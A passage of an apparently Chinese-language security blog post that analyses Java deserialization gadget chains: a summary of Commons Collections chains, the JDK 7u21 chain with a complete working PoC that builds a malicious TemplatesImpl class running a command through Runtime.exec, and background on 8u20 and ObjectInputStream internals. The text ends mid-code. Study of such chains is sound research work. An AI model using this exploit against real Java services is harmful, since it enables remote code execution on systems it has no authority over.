alt="image-20210517152132073"></p><p>会导致LazyMap2中右增加了(“yy“，”yy“)这个键值对，会影响当前lazymap2的size不再是1，而是2</p><p>导致在第二次进入的时候倒在了size的判断上。</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210517152618059.png" alt="image-20210517152618059"></p><p>当然既然还是扯到LazyMap，当然可以复用之前的InstantiateTransformer，</p><p>具体可以看我的<a href="https://github.com/0range228" target="_blank" rel="noopener">github</a>。</p><h2 id="CC链总结"><a href="#CC链总结" class="headerlink" title="CC链总结"></a>CC链总结</h2><p>五大反序列化利用基类：</p><blockquote><p>1.AnnotationInvocationHandler：反序列化的时候会循环调用成员变量的get方法，用来和lazyMap配合使用。</p><p>2.PriorityQueue：反序列化的时候会调用TransformingComparator中的transformer的transform方法，用来直接和Transformer配合使用。</p><p>3.BadAttributeValueExpException：反序列化的时候会去调用成员变量val的toString函数，用来和TiedMapEntry配合使用。（TiedMapEntry的toString函数会再去调自身的getValue）。</p><p>4.HashSet：反序列化的时候会去循环调用自身map中的put方法，用来和HashMap配合使用。</p><p>5.Hashtable：当里面包含2个及以上的map的时候，回去循环调用map的get方法，用来和LazyMap配合使用。</p></blockquote><p>四大Transformer的transform：</p><blockquote><p>1.ChainedTransformer：循环调用成员变量iTransformers数组中的tranform方法。    </p><p>2.InvokerTransformer： 通过反射的方法调用传入transform方法中的input对象的方法（方法通过成员变量iMethodName设置，参数通过成员变量iParamTypes设置）    </p><p>3.ConstantTransformer：返回成员变量iConstant的值。    </p><p>4.InstantiateTransformer：通过反射的方法返回传入参数input的实例。（构造函数的参数通过成员变量iArgs传入，参数类型通过成员变量iParamTypes传入）    </p></blockquote><p>三大Map：</p><blockquote><p>1.LazyMap：通过调用LazyMap的get方法可以触发它的成员变量factory的tranform方法，用来和上一节中的Tranformer配合使用。</p><p>2.TiedMapEntry：通过调用TiedMapEntry的getValue方法实现对他的成员变量map的get方法的调用，用来和LazyMap配合使用。</p><p>3.HashMap：通过调用HashMap的put方法实现对成员变量hashCode方法的调用，用来和TiedMapEntry配合使用（TiedMapEntry的hashCode函数会再去调自身的getValue）。</p></blockquote><h1 id="7u21"><a href="#7u21" class="headerlink" title="7u21"></a>7u21</h1><p>条件：</p><ul><li>jdk&lt;=7u21</li></ul><p>这是一条十分有个性的链，因为它仅依赖jre，不依赖任何第三方库。</p><p>先说个小tip：神奇的<code>f5a5a608</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">System.out.println(<span class="string">"f5a5a608"</span>.hashCode()); == <span class="number">0</span></span><br></pre></td></tr></table></figure><h2 id="利用链构造-1"><a href="#利用链构造-1" class="headerlink" title="利用链构造"></a>利用链构造</h2><p>用到了AnnotationInvocationHandler作为动态代理来触发cc2里面的TemplatesImpl携带恶意_bytecode，执行静态代码块加载。</p><p>前情回顾：</p><ul><li>TemplatesImpl 类可被序列化，并且其内部名为 _bytecodes 的成员可以用来存储某个 class 的字节数据</li><li>通过 TemplatesImpl 类的 getOutputProperties 方法 / newTransformer方法 ，可以最终导致 _bytecodes 所存储的字节数据被转换成为一个 Class（通过 ClassLoader.defineClass），并实例化此 Class，导致 Class 的构造方法/静态代码块中的代码被执行。</li></ul><p>光有链还是不够的，需要找个readObject的承接点，让这条链和反序列化入口点连接起来</p><p>7u21选择的入口点是LinkedHashSet的readObject方法，实际上是父类HashSet的readObject方法：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210521093720662.png" alt="image-20210521093720662"></p><p>这里面的e就是反序列化后的对象。</p><p>为什么选择HashMap呢？是因为它有个神奇的equals方法</p><p>开启支线任务：</p><p>这里先进入AnnotationInvocationHandler的invoke方法看看：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210521102440957.png" alt="image-20210521102440957"></p><p>这里如果调用的方法名称是equals，并且参数个数和类型匹配，就会进入equalsImpl方法</p><p>看一看equalsImpl方法：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210521103501367.png" alt="image-20210521103501367"></p><p>到这里，梳理一下：</p><p>我们就在jdk里面找到了一个原生类AnnotationInvocationHandler，他可以充当动态代理，他的invoke方法会调用了本身的equalsImpl方法，在equalsImpl内部又会调用自身memberValues属性的get方法。</p><p>之前我们是将this.mamberValues赋值为LazyMap，但是现在我们需要找到一个jdk原生类。</p><p>发现下面还有一个invoke方法</p><p>ysoserial的思路肯定也是盯着哪些类有equals方法，我们的动态代理只要在之后去invoke这个equals方法就可以了。</p><p>世界线收束：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210521110552890.png" alt="image-20210521110552890"></p><p>在我们之前发现的HashMap的put方法中，就会调用key的equals方法。</p><p>能到这里需要的条件：</p><ul><li>e.hash == hash</li><li>e.key == key</li></ul><p>首先会调用内部 <code>hash()</code> 函数计算 key 的 hash 值，然后遍历所有元素，*<em>当要插入的元素的 hash 和已有 entry 相同，且 key 和 Entry的 key 指向同一个对象 或 二者equals时 *</em>，则认为 key 是否已经存在，返回 oldValue，否则调用 <code>addEntry()</code> 添加元素。</p><p>这里核心关键点就是让key指向的是我们通过动态代理生成的Proxy对象，我们知道调用Proxy对象的任何方法，本质上都是在调用InvokcationHandler对象中被重写的invoke方法。因为生成Proxy对象时传入的参数是InvokcationHandler的子类AnnotationInvocationHandler，所以自然要调用AnnotationInvocationHandler.invoke()方法。</p><p>这里有几个细节：</p><ol><li>首先需要保证我们传入携带动态代理的key之前，map里面就已经有一个entry了，才能保证e不为null，进入循环</li><li>第一个entry应该为Templates对象</li><li>为了保证有有序添加，所以我们才用LinkedHashSet</li></ol><p>这里先看一下限制条件：</p><ol><li><p>e.hash == hash</p><p>这个需要保证的是两个hash值相等，hash值就是<code>hash()</code>值相等</p><p>想到我们之前的提到的神奇的<code>f5a5a608</code>，它的hashcode()==0</p></li></ol><p>看一下hash()源码：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210521111553605.png" alt="image-20210521111553605"></p><p>这里其实结果只受k.hashcode()的影响。</p><ul><li>对于普通的obj来说，这里k就是本身</li><li>对于一个代理类来说，统一调用invoke方法。如果当前的k是AnnotationInvocationHandler类，那么调用的就是AnnotationInvocationHandler类内部的hashCodeImpl()方法</li></ul><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210521112200882.png" alt="image-20210521112200882"></p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210521112527126.png" alt="image-20210521112527126"></p><p>跟进memberValueHashCode方法再看看：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210521112817611.png" alt="image-20210521112817611"></p><p>改写一下就是：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">( <span class="number">127</span> * key.hashCode() ) ^ value.hashCode()</span><br></pre></td></tr></table></figure><p>两个hash：</p><ul><li>TemplatesImpl实例.hashCode()</li><li>( 127 * key.hashCode() ) ^ TemplatesImpl实例.hashCode()</li></ul><p>我们希望key就是<code>f5a5a608</code>，这样的话返回值就是TemplatesImpl实例.hashCode()了，就可以绕过<code>e.hash == hash</code>的check了。</p><p>细节：</p><ul><li>可以看到hashCodeImpl()内部是有一个循环的，为了让最后的结果和value.hashCode()相同，我们希望memberValues只有一个entry，再put一个相同的key就行了，为了让tmpl和第一次的一样。</li><li>我们这里只需要让memberValue这个属性里面存放一个HashMap就行了，这个map的key是<code>f5a5a608</code>，value是包含恶意字节码的TemplatesImpl对象就行了</li></ul><h2 id="最终PoC"><a href="#最终PoC" class="headerlink" title="最终PoC"></a>最终PoC</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Exploit</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        <span class="comment">//1.先创建恶意类</span></span><br><span class="line">        ClassPool pool = ClassPool.getDefault();</span><br><span class="line">        pool.insertClassPath(<span class="keyword">new</span> ClassClassPath(AbstractTranslet<span class="class">.<span class="keyword">class</span>))</span>;</span><br><span class="line">        CtClass tempExploitClass = pool.makeClass(<span class="string">"3xpl01t"</span>);</span><br><span class="line">        <span class="comment">//一定要设置父类，为了后续顺利</span></span><br><span class="line">        tempExploitClass.setSuperclass(pool.get(AbstractTranslet<span class="class">.<span class="keyword">class</span>.<span class="title">getName</span>()))</span>;</span><br><span class="line">        <span class="comment">//写入payload，生成字节数组</span></span><br><span class="line">        String cmd = <span class="string">"java.lang.Runtime.getRuntime().exec(\"open /Applications/IINA.app\");"</span>;</span><br><span class="line">        tempExploitClass.makeClassInitializer().insertBefore(cmd);</span><br><span class="line">        <span class="keyword">byte</span>[] exploitBytes = tempExploitClass.toBytecode();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//2.new一个TemplatesImpl对象，修改tmpl类属性，为了满足后续利用条件</span></span><br><span class="line">        TemplatesImpl tmpl = <span class="keyword">new</span> TemplatesImpl();</span><br><span class="line">        <span class="comment">//设置_bytecodes属性为exploitBytes</span></span><br><span class="line">        Field bytecodes = TemplatesImpl.class.getDeclaredField("_bytecodes");</span><br><span class="line">        bytecodes.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        bytecodes.set(tmpl, <span class="keyword">new</span> <span class="keyword">byte</span>[][]&#123;exploitBytes&#125;);</span><br><span class="line">        <span class="comment">//一定要设置_name不为空</span></span><br><span class="line">        Field _name = TemplatesImpl.class.getDeclaredField("_name");</span><br><span class="line">        _name.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        _name.set(tmpl, <span class="string">"0range"</span>);</span><br><span class="line">        <span class="comment">//_class为空</span></span><br><span class="line">        Field _class = TemplatesImpl.class.getDeclaredField("_class");</span><br><span class="line">        _class.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        _class.set(tmpl, <span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//整个map,容量为2</span></span><br><span class="line">        Map map = <span class="keyword">new</span> HashMap(<span class="number">2</span>);</span><br><span class="line">        String magicStr = <span class="string">"f5a5a608"</span>;</span><br><span class="line">        <span class="comment">// 放入实际的 value</span></span><br><span class="line">        map.put(magicStr, tmpl);</span><br><span class="line"></span><br><span class="line">        Class clazz = Class.forName(<span class="string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>);</span><br><span class="line">        Constructor cons = clazz.getDeclaredConstructor(Class<span class="class">.<span class="keyword">class</span>,<span class="title">Map</span>.<span class="title">class</span>)</span>;</span><br><span class="line">        cons.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        InvocationHandler invocationHandler = (InvocationHandler) cons.newInstance(Templates<span class="class">.<span class="keyword">class</span>, <span class="title">map</span>)</span>;</span><br><span class="line"></span><br><span class="line">        Templates proxy = (Templates) Proxy.newProxyInstance(InvocationHandler.class.getClassLoader(), new Class[]&#123;Templates.class&#125;, invocationHandler);</span><br><span class="line"></span><br><span class="line">        HashSet target = <span class="keyword">new</span> LinkedHashSet();</span><br><span class="line">        target.add(tmpl);</span><br><span class="line">        target.add(proxy);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//payload序列化写入文件，模拟网络传输</span></span><br><span class="line">        ObjectOutputStream fout = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="keyword">new</span> File(System.getProperty(<span class="string">"user.dir"</span>)+<span class="string">"/src/main/resources/Payload_jdk7u21.ser"</span>)));</span><br><span class="line">        fout.writeObject(target);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//服务端读取文件，反序列化，模拟网络传输</span></span><br><span class="line">        ObjectInputStream fin = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="keyword">new</span> File(System.getProperty(<span class="string">"user.dir"</span>)+<span class="string">"/src/main/resources/Payload_jdk7u21.ser"</span>)));</span><br><span class="line">        <span class="comment">//服务端反序列化，触发漏洞</span></span><br><span class="line">        fin.readObject();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="8u20"><a href="#8u20" class="headerlink" title="8u20"></a>8u20</h1><p>环境：</p><ul><li>jdk &lt;= 8u20</li></ul><h2 id="7u21修复"><a href="#7u21修复" class="headerlink" title="7u21修复"></a>7u21修复</h2><p>在说8u20之前，说一下7u21的修复，修复前后的readObject对比：</p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20211110111427632.png" alt="image-20211110111427632" style="zoom:50%;"><p>在8u20中使用<code>BeanContextSupport</code>类对这个修补方式进行了绕过。</p><h2 id="基础知识补充A-序列化"><a href="#基础知识补充A-序列化" class="headerlink" title="基础知识补充A: 序列化"></a>基础知识补充A: 序列化</h2><p>整个例子</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210521160220634.png" alt="image-20210521160220634"></p><p>在ObjectOutputStream位置下个断点</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210521155206766.png" alt="image-20210521155206766"></p><p>跟进去看，构造函数就做了很多事情，会来到writeStreamHeader方法：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210521160415081.png" alt="image-20210521160415081"></p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210521160518217.png" alt="image-20210521160518217"></p><p>写入了<code>aced0005</code></p><p>接下来看下<code>out.writeObject(object)</code>是怎么写入数据的？</p><p>会先解析class结构，判断是否实现了Serializable接口，是的话执行<code>writeOrdinaryObject</code>方法</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210521160831777.png" alt="image-20210521160831777"></p><p>看下图，首先写入<code>TC_OBJECT,</code>常量<code>TC_OBJECT</code>的值是<code>(byte)0x73</code>，之后调用<code>writeClassDesc</code>方法写入类描述符，然后会调用到<code>writeNonProxyDesc</code>方法</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210521164415007.png" alt="image-20210521164415007"></p><p>进入writeNonProxyDesc方法，</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210521164739263.png" alt="image-20210521164739263"></p><p>写入<code>TC_CLASSDESC</code>的值是0x72，然后进入writeNonProxy方法</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210521164704196.png" alt="image-20210521164704196"></p><p>跟进去看看<code>getSerialVersionID</code>是做什么的，看下图可以发现，默认获取对象的<code>serialVersionUID</code>值，如果对象<code>serialVersionUID</code>的值为空则会计算出一个<code>serialVersionUID</code>的值</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210521165047244.png" alt="image-20210521165047244"></p><p>返回writeNonProxy方法看看之后做了什么事情：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210521170116717.png" alt="image-20210521170116717"></p><p>回到writeNonProxyDesc方法</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210521170318982.png" alt="image-20210521170318982"></p><p>可以看到在对当前对象的序列化之后，进行了对父类对象的序列化，写入父类的class结构信息。</p><p>到这里子类和父类的class都写完了。</p><p>接下来回到代码，接下来会进入writeSerialData写入对象的属性值。</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210521170927503.png" alt="image-20210521170927503"></p><p>进入可以看到slots存放的是对象数组，先是父类，然后才是子类对象：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210521171332673.png" alt="image-20210521171332673"></p><p>这里梳理一下流程：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">序列化类结构信息： 子类 - &gt; 父类</span><br><span class="line">  </span><br><span class="line">序列化对象信息： 父类 - &gt; 子类</span><br></pre></td></tr></table></figure><h2 id="基础知识补充B-反序列化与构造函数"><a href="#基础知识补充B-反序列化与构造函数" class="headerlink" title="基础知识补充B: 反序列化与构造函数"></a>基础知识补充B: 反序列化与构造函数</h2><p>和Safe6师傅讨论修复时候发现，ObjectInputStream对象输入流对象(implements Serializable)在参与反序列化的过程中，对象会被实例化，但是并不会触发自身的构造函数，而是触发距离最近的，未实现Serializable接口的父类的无参构造函数。</p><p>我们深入跟进一次反序列化过程：</p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20211110163608938.png" alt="image-20211110163608938" style="zoom:50%;"><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20211110163722657.png" alt="image-20211110163722657" style="zoom:50%;"><p>可以发现对象在实例化过程中，有一个神秘的<code>ConstructorAccessor</code> 帮助我们实例化了对象。</p><p>ca的实际类型是<code>GeneratedSerializationConstructorAccessor2</code> ，熟悉的ASM味道，不对劲。</p><p>它是怎么产生的？</p><p>跟进去一次readObject：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">readObject</span><br><span class="line">  readObject0</span><br><span class="line">  readOrdinaryObject</span><br></pre></td></tr></table></figure><p>我们放大<code>readOrdinaryObject</code>方法，具体看：</p><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> Object readOrdinaryObject(<span class="keyword">boolean</span> unshared)</span><br><span class="line">        throws IOException</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (bin.readByte() != TC_OBJECT) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> InternalError();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        ObjectStreamClass <span class="keyword">desc</span> = readClassDesc(<span class="keyword">false</span>); <span class="comment">//1.读取类描述信息</span></span><br><span class="line">        <span class="keyword">desc</span>.checkDeserialize();<span class="comment">//2.check该类能否反序列化，判断条件为是否实现Serializable或Externalizable其一</span></span><br><span class="line"></span><br><span class="line">        Class&lt;?&gt; cl = <span class="keyword">desc</span>.forClass();</span><br><span class="line">        <span class="keyword">if</span> (cl == String<span class="class">.<span class="keyword">class</span> || <span class="title">cl</span> == <span class="title">Class</span>.<span class="title">class</span></span></span><br><span class="line"><span class="class">                || <span class="title">cl</span> == <span class="title">ObjectStreamClass</span>.<span class="title">class</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> InvalidClassException(<span class="string">"invalid class descriptor"</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Object obj;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            obj = <span class="keyword">desc</span>.isInstantiable() ? <span class="keyword">desc</span>.newInstance() : <span class="keyword">null</span>;<span class="comment">//3.实例化对象</span></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception ex) &#123;</span><br><span class="line">            <span class="keyword">throw</span> (IOException) <span class="keyword">new</span> InvalidClassException(</span><br><span class="line">                <span class="keyword">desc</span>.forClass().getName(),</span><br><span class="line">                <span class="string">"unable to create instance"</span>).initCause(ex);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        passHandle = handles.assign(unshared ? unsharedMarker : obj);</span><br><span class="line">        ClassNotFoundException resolveEx = <span class="keyword">desc</span>.getResolveException();</span><br><span class="line">        <span class="keyword">if</span> (resolveEx != <span class="keyword">null</span>) &#123;</span><br><span class="line">            handles.markException(passHandle, resolveEx);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">desc</span>.isExternalizable()) &#123;</span><br><span class="line">            readExternalData((Externalizable) obj, <span class="keyword">desc</span>);  <span class="comment">//4.对象赋值</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            readSerialData(obj, <span class="keyword">desc</span>);  <span class="comment">//4.对象赋值</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        handles.finish(passHandle);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (obj != <span class="keyword">null</span> &amp;&amp;</span><br><span class="line">            handles.lookupException(passHandle) == <span class="keyword">null</span> &amp;&amp;</span><br><span class="line">            <span class="keyword">desc</span>.hasReadResolveMethod())</span><br><span class="line">        &#123;</span><br><span class="line">            Object rep = <span class="keyword">desc</span>.invokeReadResolve(obj);</span><br><span class="line">            <span class="keyword">if</span> (unshared &amp;&amp; rep.getClass().isArray()) &#123;</span><br><span class="line">                rep = cloneArray(rep);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (rep != obj) &#123;</span><br><span class="line">                <span class="comment">// Filter the replacement object</span></span><br><span class="line">                <span class="keyword">if</span> (rep != <span class="keyword">null</span>) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (rep.getClass().isArray()) &#123;</span><br><span class="line">                        filterCheck(rep.getClass(), Array.getLength(rep));</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        filterCheck(rep.getClass(), <span class="number">-1</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                handles.setObject(passHandle, obj = rep);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h3 id="反序列化的核心：四步走"><a href="#反序列化的核心：四步走" class="headerlink" title="反序列化的核心：四步走"></a>反序列化的核心：四步走</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ObjectStreamClass desc = readClassDesc(<span class="keyword">false</span>); <span class="comment">//1.读取类描述符号</span></span><br><span class="line">desc.checkDeserialize();<span class="comment">//2.判断条件为是否实现Serializable或Externalizable</span></span><br><span class="line">obj = desc.isInstantiable() ? desc.newInstance() : <span class="keyword">null</span>;<span class="comment">//3.实例化对象</span></span><br><span class="line">readSerialData(obj, desc);  <span class="comment">//4.对象赋值</span></span><br></pre></td></tr></table></figure><h3 id="第一步"><a href="#第一步" class="headerlink" title="第一步"></a>第一步</h3><p>进入第一步：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> ObjectStreamClass <span class="title">readClassDesc</span><span class="params">(<span class="keyword">boolean</span> unshared)</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> IOException</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">byte</span> tc = bin.peekByte();</span><br><span class="line">    ObjectStreamClass descriptor;</span><br><span class="line">    <span class="keyword">switch</span> (tc) &#123;</span><br><span class="line">        <span class="keyword">case</span> TC_NULL:</span><br><span class="line">            descriptor = (ObjectStreamClass) readNull();</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span 